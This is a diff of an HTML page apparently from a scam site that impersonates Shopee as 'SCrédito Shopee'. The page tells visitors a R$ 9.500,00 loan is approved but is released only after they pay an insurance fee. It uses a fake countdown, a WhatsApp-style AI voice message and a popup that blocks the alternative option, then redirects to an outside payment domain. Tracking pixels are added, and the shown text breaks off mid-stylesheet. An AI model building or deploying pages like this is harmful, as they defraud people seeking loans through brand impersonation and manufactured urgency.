@@ -1,13 +1,48 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Última Etapa | SCrédito Shopee</title>
-  
-  <!-- Fontes e ícones -->
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/all.min.css">
-  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
-    <link rel="stylesheet" href="css/style.css">
+<html data-capo="">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Pagamento | SCrédito Shopee</title>
+    
+    <!-- Facebook Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '913651397584478');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=913651397584478&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Facebook Pixel Code -->
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              shopee: {
+                light: "#ff7337",
+                DEFAULT: "#ee4d2d", 
+                dark: "#d5331a",
+              },
+            },
+          },
+        },
+      };
+    </script>
+
 <script>
   window.pixelId = "68478c2e2058440e4c5174d0";
   var a = document.createElement("script");
@@ -16,811 +51,1030 @@
   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
   document.head.appendChild(a);
 </script>
-  <script type="text/javascript">
-    (function(c,l,a,r,i,t,y){
-        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-    })(window, document, "clarity", "script", "r4p194wmkl");
-</script>
-  <style>
-    /* ===== VARIÁVEIS ===== */
-    :root {
-      --primary-color: #ee4d2d;
-      --primary-light: #ff7337;
-      --primary-dark: #d5331a;
-      --secondary-color: #25D366;
-      --text-color: #1f2937;
-      --light-bg: #f6f6f6;
-      --white: #ffffff;
-      --gray-100: #f7fafc;
-      --gray-200: #e2e8f0;
-      --gray-300: #cbd5e0;
-      --gray-600: #718096;
-      --gray-800: #2d3748;
-    }
-    
-    /* ===== RESET & BASE ===== */
-    * { 
-      margin: 0; 
-      padding: 0; 
-      box-sizing: border-box; 
-    }
-    
-    body {
-      font-family: 'Poppins', sans-serif;
-      background: var(--light-bg);
-      color: var(--text-color);
-      padding: 20px;
-      line-height: 1.6;
-    }
-    
-    /* ===== LAYOUT ===== */
-    .container {
-      max-width: 460px;
-      margin: 0 auto;
-      background: var(--white);
-      padding: 24px;
-      border-radius: 16px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
-    }
-    
-    /* ===== COMPONENTES ===== */
-    /* Logo */
-    .logo {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-      margin-bottom: 20px;
-      font-weight: 700;
-      font-size: 20px;
-      background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
-      padding: 20px;
-      border-radius: 16px;
-      box-shadow: 0 8px 20px rgba(238, 77, 45, 0.2);
-      position: relative;
-      overflow: hidden;
-      color: white;
-    }
-    
-    .logo::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-      animation: shine 3s infinite;
-    }
-    
-    .logo::after {
-      content: '';
-      position: absolute;
-      top: -4px;
-      left: -4px;
-      right: -4px;
-      bottom: -4px;
-      background: linear-gradient(45deg, #ee4d2d, #ff7337, #ee4d2d, #ff7337);
-      border-radius: 20px;
-      z-index: -1;
-      opacity: 0.3;
-      animation: glow 2s ease-in-out infinite alternate;
-    }
-    
-    @keyframes glow {
-      0% {
-        box-shadow: 0 0 20px rgba(238, 77, 45, 0.3);
-        transform: scale(1);
-      }
-      100% {
-        box-shadow: 0 0 30px rgba(238, 77, 45, 0.6), 0 0 40px rgba(255, 115, 55, 0.4);
-        transform: scale(1.02);
-      }
-    }
-    
-    .logo img {
-      max-width: 60px !important;
-      height: auto;
-      filter: brightness(1.2) contrast(1.1) drop-shadow(0 4px 8px rgba(0, 0, 0, 0.2));
-      transition: all 0.3s ease;
-      border-radius: 12px;
-      padding: 8px;
-      background: rgba(255, 255, 255, 0.15);
-      backdrop-filter: blur(10px);
-      border: 2px solid rgba(255, 255, 255, 0.3);
-    }
-    
-    .logo:hover img {
-      transform: scale(1.1) rotate(5deg);
-      filter: brightness(1.3) contrast(1.2) drop-shadow(0 6px 12px rgba(0, 0, 0, 0.3));
-      box-shadow: 0 0 20px rgba(255, 255, 255, 0.4);
-    }
-    
-    @keyframes shine {
-      0% { left: -100%; }
-      100% { left: 100%; }
-    }
-    
-    .logo span {
-      background: rgba(255, 255, 255, 0.2);
-      color: white;
-      padding: 6px 12px;
-      border-radius: 10px;
-      backdrop-filter: blur(10px);
-    }
-    
-    /* Títulos e textos */
-    .title {
-      font-size: 20px;
-      margin-bottom: 8px;
-      text-align: center;
-      font-weight: 600;
-      color: var(--gray-800);
-    }
-    
-    .valor-liberado {
-      color: var(--primary-color);
-      font-weight: 700;
-      font-size: 24px;
-      margin-bottom: 20px;
-      text-align: center;
-      animation: pulse 2s infinite;
-    }
-    
-    /* Seções de conteúdo */
-    .info {
-      font-size: 14px;
-      color: var(--gray-600);
-      background: var(--gray-100);
-      padding: 16px;
-      border-radius: 12px;
-      margin-bottom: 20px;
-      border-left: 4px solid var(--primary-color);
-    }
-    
-    /* Opções */
-    .opcao {
-      border: 2px solid var(--gray-200);
-      border-radius: 16px;
-      padding: 20px;
-      margin-bottom: 16px;
-      transition: all 0.3s ease;
-      background: var(--white);
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
-    }
-    
-    .opcao:first-of-type {
-      border-color: var(--primary-color);
-      background: linear-gradient(135deg, rgba(238, 77, 45, 0.05) 0%, rgba(255, 115, 55, 0.05) 100%);
-      box-shadow: 0 0 0 2px rgba(238, 77, 45, 0.1), 0 8px 20px rgba(238, 77, 45, 0.15);
-    }
-    
-    .opcao:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
-    }
-    
-    .opcao h4 {
-      margin-bottom: 12px;
-      font-size: 16px;
-      color: var(--primary-color);
-      font-weight: 600;
-    }
-    
-    .opcao ul {
-      list-style: none;
-      padding-left: 0;
-      margin-bottom: 16px;
-    }
-    
-    .opcao li {
-      font-size: 14px;
-      color: var(--gray-800);
-      margin-bottom: 8px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    
-    /* Botões */
-    .btn {
-      background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
-      color: var(--white);
-      border: none;
-      border-radius: 12px;
-      width: 100%;
-      padding: 16px;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      position: relative;
-      overflow: hidden;
-    }
-    
-    .btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 20px rgba(238, 77, 45, 0.3);
-    }
-    
-    .btn:after {
-      content: "";
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: linear-gradient(
-        to right,
-        rgba(255, 255, 255, 0) 0%,
-        rgba(255, 255, 255, 0.3) 50%,
-        rgba(255, 255, 255, 0) 100%
-      );
-      transform: rotate(30deg);
-      animation: shine 4s infinite;
-    }
-    
-    @keyframes shine {
-      0% { left: -100%; opacity: 0; }
-      10% { left: 100%; opacity: 0.6; }
-      100% { left: 100%; opacity: 0; }
-    }
-    
-    /* Player de WhatsApp */
-    .whatsapp-container {
-      margin: 25px 0;
-      position: relative;
-    }
-    
-    .whatsapp-header-text {
-      text-align: center;
-      margin-bottom: 8px;
-      font-size: 14px;
-      color: #666;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-    }
-    
-    .whatsapp-audio {
-      margin: 0 auto;
-      background: #e2f7d0;
-      border-radius: 8px;
-      padding: 12px;
-      position: relative;
-      border: 1px solid #d1e8bb;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
-      max-width: 90%;
-    }
-    
-    .whatsapp-header {
-      display: flex;
-      align-items: flex-start;
-      gap: 12px;
-      margin-bottom: 8px;
-    }
-    
-    .whatsapp-avatar-container {
-      position: relative;
-      width: 50px;
-      height: 50px;
-      border-radius: 50%;
-      overflow: hidden;
-      border: 2px solid var(--secondary-color);
-      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-    }
-    
-    .whatsapp-avatar-img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-    
-    .whatsapp-info {
-      flex-grow: 1;
-    }
-    
-    .whatsapp-name {
-      font-weight: 700;
-      font-size: 15px;
-      color: #075e54;
-      margin-top: 5px;
-    }
-    
-    .whatsapp-time {
-      font-size: 12px;
-      color: #666;
-      margin-top: 2px;
-    }
-    
-    .whatsapp-player {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      background: white;
-      border-radius: 20px;
-      padding: 8px 12px;
-      box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-      position: relative;
-    }
-    
-    .whatsapp-controls {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      flex-grow: 1;
-    }
-    
-    .whatsapp-play-btn {
-      background: var(--secondary-color);
-      color: white;
-      border: none;
-      width: 28px;
-      height: 28px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      transition: transform 0.2s;
-    }
-    
-    .whatsapp-play-btn:hover {
-      transform: scale(1.05);
-    }
-    
-    .whatsapp-progress {
-      flex-grow: 1;
-      height: 4px;
-      background: #e0e0e0;
-      border-radius: 2px;
-      position: relative;
-      overflow: hidden;
-      cursor: pointer;
-    }
-    
-    .whatsapp-progress-bar {
-      position: absolute;
-      left: 0;
-      top: 0;
-      height: 100%;
-      background: var(--secondary-color);
-      width: 0%;
-      transition: width 0.1s linear;
-    }
-    
-    .whatsapp-duration {
-      font-size: 12px;
-      color: #666;
-      min-width: 40px;
-      text-align: right;
-    }
-    
-    .whatsapp-message {
-      font-size: 12px;
-      color: #333;
-      margin-top: 8px;
-      padding-left: 8px;
-      font-style: italic;
-    }
-    
-    .whatsapp-stats {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 5px;
-      margin-top: 8px;
-      font-size: 12px;
-      color: #666;
-    }
-    
-    .whatsapp-stats-badge {
-      background: #f0f0f0;
-      padding: 2px 6px;
-      border-radius: 10px;
-      display: flex;
-      align-items: center;
-      gap: 3px;
-    }
-    
-    /* Rodapé */
-    footer {
-      text-align: center;
-      margin-top: 40px;
-      font-size: 12px;
-      color: #888;
-    }
-    
-    /* Mobile CTA */
-    .mobile-cta {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
-      padding: 16px;
-      text-align: center;
-      color: white;
-      font-weight: 700;
-      font-size: 16px;
-      border-top: 2px solid var(--white);
-      z-index: 999;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      box-shadow: 0 -4px 15px rgba(238, 77, 45, 0.2);
-    }
-    
-    /* Animações */
-    .fade-in {
-      opacity: 0;
-      transform: translateY(20px);
-      animation: fadeIn 0.6s ease-out forwards;
-    }
-    
-    @keyframes fadeIn {
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-    
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.03); }
-      100% { transform: scale(1); }
-    }
-    
-    /* Responsivo */
-    @media (max-width: 480px) {
-      .container {
-        padding: 16px;
-        margin-bottom: 70px;
-      }
-      
-      .opcao {
-        padding: 12px;
-      }
-    }
-  </style>
-  <script></script>
-  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
-    <link rel="stylesheet" href="css/style.css">
-    <script>
-      window.pixelId = "66d087b957e6489d3c29cf29";
-      var a = document.createElement("script");
-      a.setAttribute("async", "");
-      a.setAttribute("defer", "");
-      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-      document.head.appendChild(a);
-    </script>
-</head>
-<body>
-  <div class="container">
-      <header class="top-bar">
-        <div class="container">
-            <h1 class="logo" data-v-f5d5d4cd="" data-v-4f7075cc="">
-              <img src="images/image.png" alt="Logo">
-              <span>SCrédito</span>
-            </h1>
-        </div>
-    
+
+
     <style>
-      .titulo-destaque {
-        background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
-        color: white;
-        padding: 24px 20px;
-        border-radius: 16px;
-        text-align: center;
-        margin: 20px 0;
-        position: relative;
-        overflow: hidden;
-        box-shadow: 0 8px 25px rgba(238, 77, 45, 0.3);
-        animation: pulseGlow 3s ease-in-out infinite;
-      }
-      
-      .titulo-destaque::before {
-        content: '';
-        position: absolute;
-        top: 0;
-        left: -100%;
-        width: 100%;
-        height: 100%;
-        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-        animation: shine 4s infinite;
-      }
-      
-      .title-destacado {
-        font-size: 22px;
-        font-weight: 700;
-        margin: 0 0 8px 0;
-        text-shadow: 0 2px 4px rgba(0,0,0,0.2);
-        letter-spacing: 0.5px;
-      }
-      
-      .subtitle-destaque {
-        font-size: 14px;
-        opacity: 0.9;
-        font-weight: 500;
-        background: rgba(255,255,255,0.15);
-        padding: 6px 16px;
-        border-radius: 20px;
-        display: inline-block;
-        backdrop-filter: blur(10px);
-      }
-      
-      @keyframes pulseGlow {
-        0%, 100% {
-        box-shadow: 0 8px 25px rgba(238, 77, 45, 0.3);
-        transform: scale(1);
+        /*! modern-normalize v2.0.0 | MIT License | https://github.com/sindresorhus/modern-normalize */
+        *,
+        :after,
+        :before {
+            box-sizing: border-box
         }
-        50% {
-        box-shadow: 0 12px 35px rgba(238, 77, 45, 0.5), 0 0 30px rgba(255, 115, 55, 0.3);
-        transform: scale(1.02);
+
+        html {
+            font-family: system-ui, Segoe UI, Roboto, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji;
+            line-height: 1.15;
+            -webkit-text-size-adjust: 100%;
+            -moz-tab-size: 4;
+            -o-tab-size: 4;
+            tab-size: 4
         }
-      }
-      
-      @media (max-width: 480px) {
-        .title-destacado {
-        font-size: 20px;
+
+        body {
+            margin: 0;
         }
-        .titulo-destaque {
-        padding: 20px 16px;
+
+        hr {
+            color: inherit;
+            height: 0
         }
-      }
+
+        abbr[title] {
+            -webkit-text-decoration: underline dotted;
+            text-decoration: underline dotted
+        }
+
+        b,
+        strong {
+            font-weight: bolder
+        }
+
+        code,
+        kbd,
+        pre,
+        samp {
+            font-family: ui-monospace, SFMono-Regular, Consolas, Liberation Mono, Menlo, monospace;
+            font-size: 1em
+        }
+
+        small {
+            font-size: 80%
+        }
+
+        sub,
+        sup {
+            font-size: 75%;
+            line-height: 0;
+            position: relative;
+            vertical-align: baseline
+        }
+
+        sub {
+            bottom: -.25em
+        }
+
+        sup {
+            top: -.5em
+        }
+
+        table {
+            border-color: inherit;
+            text-indent: 0
+        }
+
+        button,
+        input,
+        optgroup,
+        select,
+        textarea {
+            font-family: inherit;
+            font-size: 100%;
+            line-height: 1.15;
+            margin: 0
+        }
+
+        button,
+        select {
+            text-transform: none
+        }
+
+        [type=button],
+        [type=reset],
+        [type=submit],
+        button {
+            -webkit-appearance: button
+        }
+
+        ::-moz-focus-inner {
+            border-style: none;
+            padding: 0
+        }
+
+        :-moz-focusring {
+            outline: 1px dotted ButtonText
+        }
+
+        :-moz-ui-invalid {
+            box-shadow: none
+        }
+
+        legend {
+            padding: 0
+        }
+
+        progress {
+            vertical-align: baseline
+        }
+
+        ::-webkit-inner-spin-button,
+        ::-webkit-outer-spin-button {
+            height: auto
+        }
+
+        [type=search] {
+            -webkit-appearance: textfield;
+            outline-offset: -2px
+        }
+
+        ::-webkit-search-decoration {
+            -webkit-appearance: none
+        }
+
+        ::-webkit-file-upload-button {
+            -webkit-appearance: button;
+            font: inherit
+        }
+
+        summary {
+            display: list-item
+        }
     </style>
-      <div id="countdown-container"></div>
-    </header>
-
-   
-
-      <!-- Seção de Informações -->
-      <section class="info-section">
-        <div class="info" style="background: linear-gradient(135deg, rgba(238, 77, 45, 0.05) 0%, rgba(255, 115, 55, 0.05) 100%); border-left: 6px solid var(--primary-color); padding: 20px; border-radius: 16px; margin-bottom: 20px; position: relative; box-shadow: 0 4px 15px rgba(238, 77, 45, 0.1);">
-          <div class="badge-urgente" style="background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%); color: white; padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; position: absolute; top: -10px; left: 20px;">IMPORTANTE</div>
-          <h3 style="margin-top: 15px; color: #ee4d2d; font-weight: 600;">📌 Por que solicitamos o Seguro Prestamista?</h3>
-          <p style="margin-bottom: 10px;">Essa proteção garante que seu empréstimo seja quitado mesmo em casos de:</p>
-          <div style="display: flex; gap: 10px; margin-bottom: 10px; flex-wrap: wrap;">
-            <span style="background: rgba(238, 77, 45, 0.1); color: #ee4d2d; padding: 8px 12px; border-radius: 10px; font-size: 13px; font-weight: 500;">💼 Perda de renda</span>
-            <span style="background: rgba(238, 77, 45, 0.1); color: #ee4d2d; padding: 8px 12px; border-radius: 10px; font-size: 13px; font-weight: 500;">🚑 Acidente</span>
-          </div>
-          <p>Além disso:</p>
-          <ul style="margin-left: 16px; list-style-type: disc; margin-top: 8px;">
-            <li><strong>O valor do seu empréstimo é tratado como prioridade</strong>, garantindo depósito em 5 minutos após o pagamento.</li>
-            <li><strong>O valor pago pelo seguro é abatido da primeira parcela.</strong></li><strong>
-            <li>Não é necessário apresentar bens como garantia.</li>
-          </strong></ul><strong>
-        </strong></div><strong>
-
-        <script src="js/player.js" async=""></script><script src="js/pgjek5jo9p.js" async="" type="module"></script><style>wistia-player[media-id='pgjek5jo9p']:not(:defined) { background: center / contain no-repeat url('https://fast.wistia.com/embed/medias/pgjek5jo9p/swatch'); display: block; filter: blur(5px); padding-top:56.56%; }</style> <wistia-player media-id="pgjek5jo9p" aspect="1.7679558011049723"></wistia-player>
-
-        <div class="info">
-          Caso opte por não contratar o seguro, será necessário apresentar um bem como garantia.
-        </div>
-      </strong></section><strong>
-
-      <!-- Seção de Opções -->
-      <section class="options-section">
-        <h3 id="tituloOpcoes">Escolha uma das opções abaixo:</h3>
-
-        <div class="opcao" id="opcao1">
-          <h4>✔ Seguro Prestamista <small style="color:var(--primary-color);font-weight:600">(Recomendado)</small></h4>
-          <ul>
-            <li>✅ Liberação imediata e valor total</li>
-            <li>✅ Vinculado à fatura do cartão</li>
-            <li>✅ Sem necessidade de avaliação pessoal</li>
-          </ul>
-          <button class="btn" id="next-btn" onclick="simularAcao(this)">
-            <span>Selecionar</span>
-            <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
-              <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0zM4.5 7.5a.5.5 0 0 0 0 1h5.793l-2.147 2.146a.5.5 0 0 0 .708.708l3-3a.5.5 0 0 0 0-.708l-3-3a.5.5 0 1 0-.708.708L10.293 7.5H4.5z"></path>
-            </svg>
-          </button>
-        </div>
-
-      
-    </strong><strong>
-
-    <!-- Rodapé -->
-    <footer class="footer">
-      © 2025 SCrédito Shopee - Todos os direitos reservados.<br>
-      Plataforma segura de empréstimos online
-    </footer>
-
-
-  <!-- Scripts -->
-  <script>
-    // ===== INICIALIZAÇÃO =====
-    document.addEventListener("DOMContentLoaded", function () {
-      // Valor aprovado
-      const valorEl = document.getElementById("valorAprovado");
-      if (valorEl) {
-        valorEl.innerText = "Valor aprovado: R$ 9.500,00";
-      }
-
-      // Contagem regressiva
-      initCountdown();
-      
-      // Inicializar player de áudio
-      initAudioPlayer();
-    });
-
-    // ===== FUNÇÕES =====
-    function initCountdown() {
-      let tempoRestante = 1800;
-      const timerEl = document.createElement('div');
-      timerEl.innerHTML = `<div style="margin:10px 0;padding:12px;background:rgba(238, 77, 45, 0.1);border-radius:12px;text-align:center;font-weight:600;color:#ee4d2d;border: 2px solid rgba(238, 77, 45, 0.2);">
-        ⏳ Oferta válida por: <span id="countdown">30:00</span>
-      </div>`;
-      document.querySelector('.valor-liberado').after(timerEl);
-
-      const countdown = setInterval(() => {
-        tempoRestante--;
-        const minutos = Math.floor(tempoRestante / 60);
-        const segundos = tempoRestante % 60;
-        document.getElementById('countdown').textContent = `${minutos}:${segundos < 10 ? '0' : ''}${segundos}`;
-        
-        if (tempoRestante <= 0) {
-          clearInterval(countdown);
-          timerEl.innerHTML = `<div style="margin:10px 0;padding:12px;background:rgba(220, 38, 38, 0.1);border-radius:12px;text-align:center;font-weight:600;color:#dc2626;border: 2px solid rgba(220, 38, 38, 0.2);">
-            ⏰ Oferta expirada
-          </div>`;
+    <style>
+        blockquote,
+        dd,
+        dl,
+        figure,
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6,
+        hr,
+        ol,
+        p,
+        pre,
+        ul {
+            margin: 0
         }
-      }, 1000);
-    }
 
-    function simularAcao(botao) {
-      botao.innerHTML = '<span>Processando...</span>';
-      botao.disabled = true;
-      botao.style.background = '#ccc';
-
-      setTimeout(() => {
-        botao.innerHTML = '<span>Selecionado</span> ✅';
-        botao.style.background = 'var(--primary-color)';
-        const msg = document.createElement('div');
-        msg.innerHTML = '<div style="margin-top:20px;padding:16px;border-radius:12px;background:rgba(34, 197, 94, 0.1);color:#16a34a;font-weight:600;text-align:center;border: 2px solid rgba(34, 197, 94, 0.2);">✅ Solicitação registrada com sucesso!</div>';
-        botao.parentElement.appendChild(msg);
-        setTimeout(() => {
-          window.location.href = 'parcelamento.html';
-        }, 3000);
-      }, 2000);
-    }
-
-    function simularGarantia(botao) {
-      const popup = document.createElement('div');
-      popup.innerHTML = `
-        <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:9998;"></div>
-        <div style="position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:white; padding:24px; border-radius:16px; box-shadow:0 10px 25px rgba(0,0,0,0.15); z-index:9999; max-width:90%; width:320px; text-align:center;">
-          <div style="font-size:60px; margin-bottom:10px;">😕</div>
-          <h3 style="color:#dc2626; margin-bottom:10px; font-weight: 600;">Opção Indisponível</h3>
-          <p style="color:#6b7280; margin-bottom:20px; line-height: 1.5;">No momento, esta opção está temporariamente desativada para manutenção. Por favor, selecione outra alternativa.</p>
-          <button onclick="this.parentElement.parentElement.remove()" style="background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%); color:white; border:none; padding:12px 24px; border-radius:12px; font-weight:600; cursor:pointer; width:100%;">
-            Entendi
-          </button>
-        </div>
-      `;
-      document.body.appendChild(popup);
-    }
-
-    function initAudioPlayer() {
-      const audio = new Audio("https://worksollutions.site/wp-content/uploads/2025/04/ElevenLabs_2025-04-08T18_02_11_RATO_ivc_sp112_s34_sb97_se4_b_m2.mp3");
-      const playBtn = document.getElementById('playAudio');
-      const playIcon = document.getElementById('playIcon');
-      const progressBar = document.getElementById('progressBar');
-      const progressContainer = document.getElementById('progressContainer');
-      const durationDisplay = document.getElementById('duration');
-      
-      // Formatar tempo (mm:ss)
-      function formatTime(seconds) {
-        const mins = Math.floor(seconds / 60);
-        const secs = Math.floor(seconds % 60);
-        return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
-      }
-      
-      // Atualizar barra de progresso
-      audio.addEventListener('timeupdate', function() {
-        const progress = (audio.currentTime / audio.duration) * 100;
-        progressBar.style.width = `${progress}%`;
-        durationDisplay.textContent = formatTime(audio.currentTime);
-      });
-      
-      // Quando o áudio terminar
-      audio.addEventListener('ended', function() {
-        playIcon.classList.remove('fa-pause');
-        playIcon.classList.add('fa-play');
-        audio.currentTime = 0;
-      });
-      
-      // Controle do botão play/pause
-      playBtn.addEventListener('click', function() {
-        if (audio.paused) {
-          audio.play();
-          playIcon.classList.remove('fa-play');
-          playIcon.classList.add('fa-pause');
-        } else {
-          audio.pause();
-          playIcon.classList.remove('fa-pause');
-          playIcon.classList.add('fa-play');
+        ol,
+        ul {
+            list-style: none;
+            padding: 0
         }
-      });
-      
-      // Pular para posição clicada na barra de progresso
-      progressContainer.addEventListener('click', function(e) {
-        const rect = this.getBoundingClientRect();
-        const pos = (e.clientX - rect.left) / rect.width;
-        audio.currentTime = pos * audio.duration;
-      });
-      
-      // Carregar metadados para mostrar duração total
-      audio.addEventListener('loadedmetadata', function() {
-        durationDisplay.textContent = formatTime(audio.currentTime);
-      });
-      
-      // Pré-carregar o áudio
-      audio.preload = "auto";
-    }
-  </script>
-  <script>
-       // Função para capturar todos os parâmetros da URL
-        function getUrlParams() {
-            const params = {};
-            const queryString = window.location.search.substring(1);
-            const pairs = queryString.split('&');
-        
-            pairs.forEach(pair => {
-                const [key, value] = pair.split('=');
-                if (key) {
-                    params[decodeURIComponent(key)] = decodeURIComponent(value || '');
-                }
-            });
-        
-            return params;
+
+        img,
+        video {
+            height: auto;
+            max-width: 100%
         }
-        
-        // Função para construir a nova URL com os parâmetros (filtrando CPF)
-        function buildUrlWithParams(baseUrl, params) {
-            // Filtrar parâmetros sensíveis como CPF
-            const filteredParams = {};
-            Object.keys(params).forEach(key => {
-                // Não incluir CPF ou outros dados pessoais sensíveis
-                if (key.toLowerCase() !== 'cpf' && key.toLowerCase() !== 'nome') {
-                    filteredParams[key] = params[key];
-                }
-            });
-            
-            const queryString = Object.keys(filteredParams)
-                .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(filteredParams[key])}`)
-                .join('&');
-        
-            return `${baseUrl}?${queryString}`;
+
+        *,
+        :after,
+        :before {
+            border: 0 solid #000
         }
-        
-        // Captura todos os botões com a classe 'request-btn'
-        const buttons = document.querySelectorAll('#next-btn');
-        
-        // Adiciona um evento de clique a cada botão
-        buttons.forEach(button => {
-            button.addEventListener('click', function(event) {
-                event.preventDefault(); // Impede o comportamento padrão do botão
-        
-                // Captura os parâmetros da URL atual
-                const params = getUrlParams();
-        
-                // Constrói a nova URL com os parâmetros
-                const newUrl = buildUrlWithParams('https://pay.pagamentosfacilitadosoficial.shop/5pjw3RnKmrr32lQ', params);
-        
-                // Redireciona para a nova URL
-                window.location.href = newUrl;
-            });
-        });
+
+        :root {
+            --primary: #ee4d2d;
+            --red: #ee4d2d;
+            --green: #27ae60;
+            --shopee-light: #ff7337;
+            --shopee-dark: #d5331a;
+        }
+
+        body {
+            background-color: #f6f6f6;
+            font-family: "Poppins", sans-serif;
+            color: #000;
+            font-size: 16px
+        }
+
+        #__nuxt,
+        body,
+        html {
+            height: 100%
+        }
+
+        a {
+            color: #1b98e0;
+            text-decoration: none
+        }
+
+        a:hover {
+            cursor: pointer;
+            text-decoration: underline
+        }
+
+        .text-red {
+            color: var(--red)
+        }
+
+        .text-green {
+            color: var(--green)
+        }
+
+        .text-primary {
+            color: var(--primary)
+        }
+
+        h2 {
+            font-weight: 500
+        }
+    </style>
+    <style>
+        .default-layout[data-v-77968890] {
+            display: grid;
+            grid-template-areas: "top-bar" "content" "footer";
+            grid-template-rows: auto 1fr auto;
+            min-height: 100vh
+        }
+
+        .default-layout .top-bar[data-v-77968890] {
+            grid-area: top-bar
+        }
+
+        .default-layout .content[data-v-77968890] {
+            background-color: #ffffff;
+            grid-area: content
+        }
+
+        .default-layout .footer[data-v-77968890] {
+            grid-area: footer
+        }
+    </style>
+    <style>
+        .top-bar[data-v-f5d5d4cd] {
+            background-color: var(--primary);
+            border-bottom: 1px solid hsla(0, 0%, 100%, .3);
+            width: 100%
+        }
+
+        .top-bar .container[data-v-f5d5d4cd] {
+            display: grid;
+            padding: 1.5rem 0;
+            place-content: center
+        }
+    </style>
+    <style>
+        .container[data-v-0041013f] {
+            box-sizing: border-box;
+            margin: 0 auto;
+            padding-left: 1rem;
+            padding-right: 1rem
+        }
+
+        @media (min-width:640px) {
+            .container[data-v-0041013f] {
+                max-width: 90%
+            }
+        }
+
+        @media (min-width:768px) {
+            .container[data-v-0041013f] {
+                max-width: 85%
+            }
+        }
+
+        @media (min-width:1024px) {
+            .container[data-v-0041013f] {
+                max-width: 80%
+            }
+        }
+
+        @media (min-width:1280px) {
+            .container[data-v-0041013f] {
+                max-width: 1000px
+            }
+        }
+    </style>
+    <style>
+        img.logo[data-v-4f7075cc] {
+            height: var(--2348ed9e);
+            width: auto
+        }
+
+        h1.logo[data-v-4f7075cc] {
+            color: #fff;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, .2)
+        }
+    </style>
+    <style>
+        .fee-page[data-v-d5c2a0e6] {
+            margin: 2.5rem 0
+        }
+
+        .container[data-v-d5c2a0e6] {
+            display: grid;
+            gap: 3rem;
+            max-width: 480px
+        }
+
+        .intro[data-v-d5c2a0e6] {
